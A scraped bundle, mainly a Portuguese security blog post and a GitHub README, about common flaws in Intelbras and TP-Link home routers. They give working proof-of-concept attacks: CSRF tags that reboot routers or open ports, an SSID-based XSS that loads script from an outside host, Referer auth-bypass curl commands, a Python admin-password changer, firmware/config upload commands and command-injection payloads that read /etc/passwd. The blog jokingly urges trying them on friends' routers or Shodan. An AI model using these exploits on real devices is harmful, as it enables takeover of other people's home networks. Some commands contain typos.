=== Content from fireshellsecurity.team_0f9ed608_20250119_112903.html ===

[![](/assets/images/title.gif)](/)

* [Home](/)
* [Team](/team/)
* [Articles](/articles/)
* [Portfolio](/portfolio/)
* [Sponsors](/sponsors/)
* [About](/about/)

Wednesday, November 20, 2019

# Hack 'N' Routers - Vulnerabilidades comuns em roteadores dom√©sticos - [PT-BR]

by [Elber "f0lds" Tavares](/f0lds/)

Hack 'N' Routers - Vulnerabilidades comuns em roteadores dom√©sticos - [PT-BR]

Hackers xiaomi e androids, algumas pessoas j√° vem me pedindo a algum tempo para falar um pouco sobre algumas vulns e exploits para roteadores (acho que √© para fins educacionais), ent√£o, hoje irei falar sobre algumas vulnerabilidades presentes em alguns modelos de roteadores dom√©sticos, os quais na maioria das vezes seus donos/usu√°rios n√£o se preocupam em manter sua firmware atualizado, tamb√©m citarei exemplos explicando por que na maioria das vezes manter seu aparelho atualizado ainda poder√° deixar passar alguns ataques.

Usarei os roteadores de marcas Intelbras e TP-Link nos exemplos, pois at√© agora s√£o os √∫nicos que tenho em m√£os para realizar os testes, mas acredito que sirva de base para que voc√™s possam replicar os mesmos bugs em outros modelos.

Come√ßando pelo bom e velho Intelbras, acho que tudo que tem ‚ÄúIntelbras‚Äù em seu nome ter√° esses mesmos bugs, vou citar s√≥ alguns exemplos em determinados modelos e vers√µes, mas os bugs foram testados em outros tipos de pain√©is e na maioria eles estavam l√°.

## CSRF

### Roteador Wireless N 150 Mbps -WRN 240

![itb](https://i.imgur.com/Wqpbpj9.png)

Acho que essa √© a vulnerabilidade mais comum e conhecida nesses roteadores, [Cross-site Request Forgery](https://pt.wikipedia.org/wiki/Cross-site_request_forgery) (CSRF ou XSRF), em portugu√™s falsifica√ß√£o de solicita√ß√£o entre sites, tamb√©m conhecido como ataque de um clique.

Para salvar ou alterar alguma informa√ß√£o, seu painel adiciona esses valores em par√¢metros em uma URL e faz a requisi√ß√£o via GET, onde essa URL √© requisitada atrav√©s de javascript ou iframe.

**Exemplo**

Para reiniciar o roteador, quando vamos l√° no menu e clicamos no bot√£o reiniciar, o painel faz a requisi√ß√£o para o endere√ßo: `http://192.168.0.1/userRpm/SysRebootRpm.htm?Reboot=Reiniciar`

![restart](https://i.imgur.com/Uq1aiXb.png)

E ent√£o o roteador reinicia.

Poder√≠amos fazer o mesmo procedimento de uma maneira ‚Äúescondida‚Äù do admin.

```
$ echo ‚Äú<img src=‚Äôhttp://192.168.0.1/userRpm/SysRebootRpm.htm?Reboot=Reiniciar‚Äô>‚Äù > poc.html

```

![poc](https://i.imgur.com/mBunIIJ.png)

Agora podemos usar para alterar algumas outras informa√ß√µes como, nome da rede wifi, senhas, adicionar portas redirecionadas, mudar DNS etc.

**V√≠deo salvo em 02/07/2018**

Tamb√©m testado no painel do *WRN 150*

![wrn](https://i.imgur.com/xo7Oz5g.png)

### Outro exemplo, agora com o **TP-LINK 150M Wireless N Router Model No. TL-WR740N**

```
<img src="http://192.168.0.1/userRpm/VirtualServerRpm.htm?ExPort=22&InPort=22&Ip=192.168.0.100&Protocol=1&State=1&Commonport=0&Changed=0&SelIndex=0&Page=1&Save=Save">

```
## XSS

Podemos encontrar XSS facilmente em v√°rios inputs, principalmente se juntarmos o CSRF+XSS.

Mas vou mostrar um que achei mais ‚Äúapresent√°vel‚Äù pelo fato de que podemos encontrar o mesmo bug em outros dispositivos al√©m de roteadores.

O XSS por SSID de um outro AP, nos roteadores podemos encontrar esse bug em p√°ginas que mostrem SSID de outras redes, normalmente nas configura√ß√µes para adicionar um novo ‚ÄúAP‚Äù.

Como o painel estar√° mostrando o nome das outras redes wireless, as vezes ele n√£o filtra esses SSID e com isso conseguimos nosso XXS.

**Exemplo**

Subindo nosso payload:

```
airbase-ng -e "</script><script src='//elb.me'>" -c 8 -v wlan0mon

```

Conteudo em *elb.me*:

```
alert('xss');

```
### Resultado

![alert](https://i.imgur.com/F12K9wP.png)

Tenho um post sobre isso, explicando mais detalhadamente:

* [XSS NO ROTEADOR INTELBRAS WRN 240](https://fireshellsecurity.team/cve-2017-14219-xss-no-roteador-intelbras-wrn-240/)

## Auth Bypass: Alterando firmware e configura√ß√µes sem autenticar no painel

Primeiro come√ßarei falando de um bug que encontrei num dos roteadores da TP-Link, n√£o vou tomar os cr√©ditos para mim pois enquanto pesquisava notei que algu√©m j√° tinha reportado os mesmos, s√≥ que em outros modelos.

As vulnerabilidades baseavam-se em conseguir alterar ou ver informa√ß√µes no painel do roteador somente estando na mesma rede que o dispositivo, informa√ß√µes que somente quem poderia ver seriam pessoas que estivessem autenticadas nessa √°rea administrativa.

A aplica√ß√£o n√£o ignorava headers de autentica√ß√£o, principalmente o `"Cookie: Authorization=Basic BASE64="` mas verificava apenas o `"Referer: http://ip.router/"`, pois para ela se o usu√°rio estava vindo com esse header, ele certamente estaria autenticado na plataforma, isso abriu ### portas para um novo ataque.

**Exemplo**

```
curl -X GET http://192.168.0.1/cgi/conf.bin

```

Resposta: `HTTP/1.1 403 Forbidden`

```
curl -X GET -H "Referer: http://192.168.0.1/mainFrame.htm" http://192.168.0.1/cgi/conf.bin

```

Resposta: `HTTP/1.1 200 OK`

#### Exemplo de altera√ß√£o de senha do painel do roteador:

```
import requests

new = input('New Pass: ')
url = 'http://192.168.0.1/cgi?8'
headers = {'Content-Type': 'text/plain',
 'Referer': 'http://192.168.0.1/mainFrame.htm'}

data = ''
data += '[/cgi/auth#0,0,0,0,0,0#0,0,0,0,0,0]0,3\x0d\x0a'
data += 'oldPwd=admin\x0d\x0a'
data += 'name=admin\x0d\x0a'
data += 'pwd='+new+'\x0d\x0a'

r = requests.post(url,data=data,headers=headers)

print(r.text)

```
## Novos firmwares velhas vulns

Atualizei minha firmware para a nova vers√£o publicada no site do distribuidor, e decidi verificar se algo tinha mudado, e realmente o bug do `Referer` n√£o estava mais l√°, independente de `Referer` ou n√£o, todas as requisi√ß√µes GET estavam sendo liberadas somente para quem tivesse o *cookie* certo.

Mas ainda sobrou alguns lugares em que as altera√ß√µes eram feitas via POST, que no caso seriam: Restaurar arquivos de backup e alterar ou atualizar a firmware.

Restaurando backup do modelo Intelbras, mesmo removendo o `Authorization: Basic` ainda conseguimos fazer o upload do arquivo:

> Modelo testado - WRN240 (v√°rios modelos e vers√µes de firmware tamb√©m apresentaram o mesmo bug).

![](https://i.imgur.com/xFI9Ulv.png)

Uma boa ideia para tentar, seria baixar um arquivo de backup do seu *router* e subir o mesmo no *router* do seu amigo:

#### PoC

```
curl -i -X POST -H "Content-Type: multipart/form-data" -H "Referer: http://192.168.0.1/userRpm/BakNRestoreRpm.htm" -F data=@config.bin http://192.1680.1/incoming/RouterBakCfgUpload.cfg

```

O mesmo acontece com a op√ß√£o de atualizar a firmware.

![](https://i.imgur.com/3bEJT2e.png)

#### TP-Link

> Modelo testado TP-LINK TL-WR849N 0.9.1 4.16

![](https://i.imgur.com/oedwA0w.png)

```
curl -i -X POST -H "Content-Type: multipart/form-data" -H "Referer: http://192.168.0.2/mainFrame.htm" -F data=@conf.binhttp://192.168.0.2/cgi/confup

```
## N√£o fa√ßam isso em casa

Por enquanto √© s√≥ isso, atualizarei este post frequentemente caso tenham mais modelos e novos bugs para demonstrar, n√£o tentem reproduzir essas perip√©cias em casa, tentem nos *routers* de amigos ou no Shodan, √© mais divertido üòâ.

![rip](https://i.imgur.com/cirhrTd.jpg)

## Refer√™ncias

* [XSS NO ROTEADOR INTELBRAS WRN 240](https://fireshellsecurity.team/cve-2017-14219-xss-no-roteador-intelbras-wrn-240/)
* [intelbras dns change csrf](https://www.youtube.com/watch?v=6VliMWsu3hc)
* [TP-LINK: Derrubando painel administrador com 1 requisi√ß√£o (Sem autentica√ß√£o)](https://youtu.be/qxIbyd3MK9Y)
* [POC Router](https://www.youtube.com/watch?v=oRPOKkdrGv4)
* [TP-Link TL-WR840N/TL-WR841N - Authenticaton Bypass](https://www.exploit-db.com/exploits/44781)
* [Exploit Database Advanced Search - Title: TP-Link](https://www.exploit-db.com/search?q=TP-Link)

[Common Vulnerabilities and Exposures](/cve/)
,
[Pentest](/pentest/)
,
[Proof of Concept](/poc/)

Please enable JavaScript to view the [comments powered by Disqus.](https://disqus.com/?ref_noscript)

---

All content copyright FireShell Security Team ¬© 2017 - 2024.

All rights reserved.



=== Content from github.com_db3ee4a4_20250119_112905.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FElberTavares%2Frouters-exploit%2Ftree%2Fmaster%2Ftp-link)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  + [Nonprofits](/solutions/industry/nonprofits)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FElberTavares%2Frouters-exploit%2Ftree%2Fmaster%2Ftp-link)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Ffiles%2Fdisambiguate&source=header-repo&source_repo=ElberTavares%2Frouters-exploit)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[ElberTavares](/ElberTavares)
/
**[routers-exploit](/ElberTavares/routers-exploit)**
Public

* [Notifications](/login?return_to=%2FElberTavares%2Frouters-exploit) You must be signed in to change notification settings
* [Fork
  9](/login?return_to=%2FElberTavares%2Frouters-exploit)
* [Star
   11](/login?return_to=%2FElberTavares%2Frouters-exploit)

* [Code](/ElberTavares/routers-exploit)
* [Issues
  0](/ElberTavares/routers-exploit/issues)
* [Pull requests
  0](/ElberTavares/routers-exploit/pulls)
* [Actions](/ElberTavares/routers-exploit/actions)
* [Projects
  0](/ElberTavares/routers-exploit/projects)
* [Security](/ElberTavares/routers-exploit/security)
* [Insights](/ElberTavares/routers-exploit/pulse)

Additional navigation options

* [Code](/ElberTavares/routers-exploit)
* [Issues](/ElberTavares/routers-exploit/issues)
* [Pull requests](/ElberTavares/routers-exploit/pulls)
* [Actions](/ElberTavares/routers-exploit/actions)
* [Projects](/ElberTavares/routers-exploit/projects)
* [Security](/ElberTavares/routers-exploit/security)
* [Insights](/ElberTavares/routers-exploit/pulse)

## Files

¬†master
## Breadcrumbs

1. [routers-exploit](/ElberTavares/routers-exploit/tree/master)
/
# tp-link

/Copy path
## Directory actions

## More options

## Directory actions

## More options

## Latest commit

## History

[History](/ElberTavares/routers-exploit/commits/master/tp-link)¬†master
## Breadcrumbs

1. [routers-exploit](/ElberTavares/routers-exploit/tree/master)
/
# tp-link

/Top
## Folders and files

| Name | | Name | Last commit message | Last commit date |
| --- | --- | --- | --- | --- |
| parent directory[..](/ElberTavares/routers-exploit/tree/master) | | |
| [RCE-TLWR849N.py](/ElberTavares/routers-exploit/blob/master/tp-link/RCE-TLWR849N.py "RCE-TLWR849N.py") | | [RCE-TLWR849N.py](/ElberTavares/routers-exploit/blob/master/tp-link/RCE-TLWR849N.py "RCE-TLWR849N.py") |  |  |
| [README.md](/ElberTavares/routers-exploit/blob/master/tp-link/README.md "README.md") | | [README.md](/ElberTavares/routers-exploit/blob/master/tp-link/README.md "README.md") |  |  |
| [tp-link\_painel\_pass\_change.py](/ElberTavares/routers-exploit/blob/master/tp-link/tp-link_painel_pass_change.py "tp-link_painel_pass_change.py") | | [tp-link\_painel\_pass\_change.py](/ElberTavares/routers-exploit/blob/master/tp-link/tp-link_painel_pass_change.py "tp-link_painel_pass_change.py") |  |  |
| View all files | | |

## [README.md](#readme)

# [CVE-2020-9374] TP LINK TL-WR849N - REMOTE COMMAND EXECUTION PoC

[![replace](/ElberTavares/routers-exploit/raw/master/src/rce.png)](/ElberTavares/routers-exploit/blob/master/src/rce.png)

[Poc - RCE-TLWR849N.py](/ElberTavares/routers-exploit/blob/master/tp-link/RCE-TLWR849N.py)

## Model

0.9.1 4.16 v004c.0 Build 180628 Rel.54314n(4252)

## Download

<https://www.tp-link.com/br/support/download/tl-wr849n/#Firmware>

## Vuln

The vulnerability is present in the Diagnostics area of the router, where it is possible to perform ping and tracerout tests.

## Exploiting

In the "Tracerout" input we will send the payload to bypass the filter and get the RCE.

**Payloads**

```
 "$(cat /etc/passwd)"
 "`cat /etc/passwd`"
 ;`ping host.com`
```

#### If the page has a filter that doesn't allow special characters, we can circumvent it with Burp.

[![replace](/ElberTavares/routers-exploit/raw/master/src/replace.png)](/ElberTavares/routers-exploit/blob/master/src/replace.png)

Math/replace > Response Body

Math: window.location.href="<http://192.168.21.1>";

Replace: alert('injected');

# Auth Bypass: Firmware and Configs update

## Vuln

The application ignore authentication headers, and checked only "Referer: <http://ip.router/>",
if the user is coming with this header, he would certainly be authenticated on the platform

## Exploiting

`curl -X GET http://192.168.0.1/cgi/conf.bin`

Response: `HTTP/1.1 403 Forbidden`

`curl -X GET -H "Referer: http://192.168.0.1/mainFrame.htm" http://192.168.0.1/cgi/conf.bin`

Response: `HTTP/1.1 200 OK`

[Poc - Change admin password](/ElberTavares/routers-exploit/blob/master/tp-link/tp-link_painel_pass_change.py)

# [CVE-2019-19143] Firmware Update: Uploading new firmware without access to the panel

## Model

TP-LINK TL-WR849N 0.9.1 4.16
[![replace firmware](https://camo.githubusercontent.com/11a78556268887ae402476043e71e70f56cb2c759330a32578f99f049ec920c9/68747470733a2f2f692e696d6775722e636f6d2f6f6564774130772e706e67)](https://camo.githubusercontent.com/11a78556268887ae402476043e71e70f56cb2c759330a32578f99f049ec920c9/68747470733a2f2f692e696d6775722e636f6d2f6f6564774130772e706e67)

## Vuln

The auth bypass vulnerability has been fixed in some versions, but the firmware bypass is present in the latest versions.

## Exploit

Updating the firmware and injecting a new configuration file into the router.

```
curl -i -X POST -H "Content-Type: multipart/form-data" -H "Referer: http://192.168.0.2/mainFrame.htm" -F data=@conf.bin http://192.168.0.2/cgi/confup

```

## Footer

¬© 2025 GitHub,¬†Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can‚Äôt perform that action at this time.



=== Content from packetstormsecurity.com_6914034a_20250119_112902.html ===

[![](/logos/smalllogobeta.png)](/)

* files
* news
* users
* cve

[![](/logos/smalllogobeta.png)](/)

* files
* news
* users
* cve

![](/logos/linegray.png)

¬†[About](/help/view/4) |
[Terms](/tos/) |
[Copyright](/help/view/7) |
[Privacy](/help/view/6) |
[BlueSky](https://bsky.app/profile/packetstorm.bsky.social) |
[X](https://x.com/packet_storm) |
[Mastodon](https://infosec.exchange/%40packet_storm/)


